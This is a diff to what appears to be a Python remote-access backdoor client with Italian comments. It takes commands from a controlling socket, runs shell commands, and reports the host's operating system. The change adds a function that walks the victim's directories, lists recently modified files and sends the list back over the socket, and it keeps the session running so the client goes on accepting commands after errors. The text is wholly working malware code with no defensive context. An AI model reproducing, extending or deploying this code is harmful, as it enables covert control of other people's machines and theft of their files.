@@ -14,7 +14,6 @@ def sendDir(clientSocket, cmd):
 def exitNClose(clientSocket):
     out = "Ok"
     clientSocket.send(out.encode())
-    clientSocket.close()
     return True
 
 
@@ -105,6 +104,30 @@ def shellCommandExecuter(clientSocket, cmd):
     clientSocket.recv(1024) #87
     clientSocket.send(output.encode()) #88
 
+def recentFilesCmd(clientSocket, fromData = "1990-01-01"):
+    output = ""
+    print(fromData)
+    try:
+        fileList = []
+        for root, dirs, files in os.walk(".", topdown=True):
+            for file in files:
+                path = root + "\\" + file
+                if os.path.exists(path):
+                    fileData = os.path.getmtime(path)
+                    data = time.strftime('%Y-%m-%d', time.localtime(fileData))
+                    if data > fromData:
+                        fileList.append(data + " " + path)
+        fileList.sort()
+        for elem in fileList:
+            string = elem + "\n"
+            output = output + string
+    except:
+        output = "Error"
+    print(output)
+    pSize = str(output.__sizeof__())
+    clientSocket.send(pSize.encode())
+    clientSocket.recv(1024)
+    clientSocket.send(output.encode())
 
 def main():
     while True:
@@ -113,7 +136,7 @@ def main():
             RecuperaOs(clientSocket)
             esc = False
 
-            while not esc: #non ho capito perche ci questa?
+            while not esc:
                 cmd = clientSocket.recv(1024).decode()
                 if len(cmd) == 0:
                     break
@@ -149,7 +172,14 @@ def main():
                     shellCommand = clientSocket.recv(1024).decode() #78
                     if searchCmd(clientSocket, shellCommand):
                         print("true")
-            break
+                elif "rf" in cmd:
+                    if cmd == "rf":
+                        recentFilesCmd(clientSocket)
+                    elif "rf " in cmd:
+                        data = cmd.replace("rf ", "")
+                        recentFilesCmd(clientSocket, data)
+
+
         except Exception as e:
             print(e)
             print("errore Riavvio in corso")
